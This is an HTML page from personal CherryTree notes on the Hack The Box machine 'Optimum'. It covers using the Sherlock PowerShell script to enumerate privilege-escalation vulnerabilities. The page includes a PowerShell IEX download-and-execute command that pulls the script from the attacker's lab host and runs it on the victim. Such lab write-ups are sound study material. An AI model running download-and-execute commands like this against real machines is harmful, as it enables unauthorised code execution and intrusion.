<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sherlock</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--optimum.html">optimum</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--http--http_file_server_2.3_null_byte_exploit.html">http file server 2.3 null byte exploit</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--http--webpage_code_injection.html">webpage code injection</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell.html">Powershell</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang.html">Nishang</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--Invoke-PoweShellTcp.ps1.html">Invoke-PoweShellTcp.ps1</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine.html">run powershell on victim machine</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine--pre_URL_encode.html">pre URL encode</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS.html">upload to HFS</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS--reverse_shell.html">reverse shell</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock.html">Sherlock</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--Sherlock_functions.html">Sherlock functions</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--report.html">report</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--interesting_finds.html">interesting finds</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032.html">MS16-032</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--Empire.html">Empire</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--vi_MS16032.html">vi MS16032</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--run_MS16-032_w-_reverse_shell.html">run MS16-032 w/ reverse shell</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--optimum--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--optimum--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>Sherlock</u></b></h1><span style="color:#24ff00;">For this box, we're going to utilize a great powershell based </span><span style="color:#ffff00;">privilege escalation enumeration tool</span><span style="color:#24ff00;"> called </span><span style="color:#ffa500;">sherlock</span> <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">here's the github for it</a><br /><br /><span style="color:#24ff00;">First thing is to move a copy of </span><span style="color:#ffa500;">Sherlock</span><span style="color:#24ff00;"> into our working directory:</span><br /><img src="images/501-1.png" alt="images/501-1.png" /><br /><br /><span style="color:#24ff00;">But before we want to upload it to our victim, there is a quick line of code we'll want to add to the bottom of the script to find vulnerabilities on our victim</span><br /><span style="color:#ffa500;">Find-AllVulns</span><br /><br /><br /><img src="images/501-2.png" alt="images/501-2.png" /><br /><img src="images/501-3.png" alt="images/501-3.png" /><br /><br /><br /><span style="color:#24ff00;">Now that our Sherlock script is ready to go, lets Host it via http with </span><span style="color:#ffa500;">SimpleHTTPServer</span><br /><span style="color:#ffa500;">python -m SimpleHTTPServer </span><br /><img src="images/501-4.png" alt="images/501-4.png" /><br /><br /><br /><span style="color:#24ff00;">And Download it to the victim with the powershell command:</span><br /><span style="color:#ffa500;">IEX(New-Object net.webclient).downloadstring('http://10.10.14.62/8000/Sherlock.ps1')</span><br /><img src="images/501-5.png" alt="images/501-5.png" /><br /><br /><br /></div></div>
</body></html>